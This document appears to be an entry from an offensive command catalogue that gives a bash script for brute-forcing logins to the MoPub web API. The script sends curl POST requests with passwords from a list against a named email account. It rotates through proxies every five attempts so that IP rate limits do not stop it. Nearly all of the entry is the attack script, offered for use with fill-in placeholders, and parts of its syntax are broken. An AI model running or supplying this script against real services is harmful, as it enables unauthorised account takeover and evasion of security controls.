---
data: >-
  #!/bin/bash


  proxyip=(proxy1 proxy2 ...) //put your proxy here


  pass=(pass1 pass2 ...) //put your list of password here


  echo "| PASSWORD | PROXY_IP Server_Status "

  for(( i=0; i<=100; i++))

  do

  proxys=${proxyip[i]}


  COUNTER=0

  for(( p; p<=999; p=$[$p+1]))

  do

  COUNTER=$[$COUNTER +1]

  pas=${pass[p]}

  res=`curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101
  Firefox/74.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H
  $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H
  $'x-csrftoken: █████████' -H $'Content-Length: 62' -H $'Origin:
  https://app.mopub.com' -H $'Connection: close' -H $''-H $'Referer:
  https://app.mopub.com/login' -H $'Cookie: csrftoken=████' -b
  $'csrftoken=█████████' --data-binary
  $'{"username":"alert.wids@gmail.com","password":"$pas"}'$'https://app.mopub.com/web-client/api/user/login'
  -x "$proxys"|grep -a ' 403\| 400\| 204\| 401\| 503'`



  echo "| $pas | $proxys${res}"

  if[[ $COUNTER -ge 5 ]];then

  break

  fi

  continue

  done

  p=$[$p + 1]

  done
tags:
  - brute-force
  - proxy
type: command
executor: bash
platforms:
  - Web
  - Linux
id: 8d9ea013-c6bf-4d0f-b278-545f7529da37
created_at: '2025-12-14T17:30:26.704Z'
updated_at: '2025-12-14T17:30:26.704Z'
verified: false
validated: true
submitted: true
---
# mopub-proxy-rotation-bash-script

## Command

```bash
#!/bin/bash

proxyip=(proxy1 proxy2 ...) //put your proxy here

pass=(pass1 pass2 ...) //put your list of password here

echo "| PASSWORD | PROXY_IP Server_Status "
for(( i=0; i<=100; i++))
do
proxys=${proxyip[i]}

COUNTER=0
for(( p; p<=999; p=$[$p+1]))
do
COUNTER=$[$COUNTER +1]
pas=${pass[p]}
res=`curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'x-csrftoken: █████████' -H $'Content-Length: 62' -H $'Origin: https://app.mopub.com' -H $'Connection: close' -H $''-H $'Referer: https://app.mopub.com/login' -H $'Cookie: csrftoken=████' -b $'csrftoken=█████████' --data-binary $'{"username":"alert.wids@gmail.com","password":"$pas"}'$'https://app.mopub.com/web-client/api/user/login' -x "$proxys"|grep -a ' 403\| 400\| 204\| 401\| 503'`


echo "| $pas | $proxys${res}"
if[[ $COUNTER -ge 5 ]];then
break
fi
continue
done
p=$[$p + 1]
done
```

## Description

Bash script that cycles through proxy and password arrays, sending up to 5 curl requests per proxy to brute-force MoPub logins while bypassing IP limits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| proxyip | Array of proxy addresses | Yes |
| pass | Array of passwords | Yes |
| -x | Curl proxy flag | Yes per request |
| x-csrftoken | CSRF token | Yes |

## Examples

### Basic Usage

Define arrays and run the script.

## Expected Output

Table-like echoes: | password | proxy | status codes (e.g., 403 400 204 401 503).

## Related

- [[procedures/Alternative-Bypass-with-AWS-API-Gateway-or-Bash-Proxy-Script]]
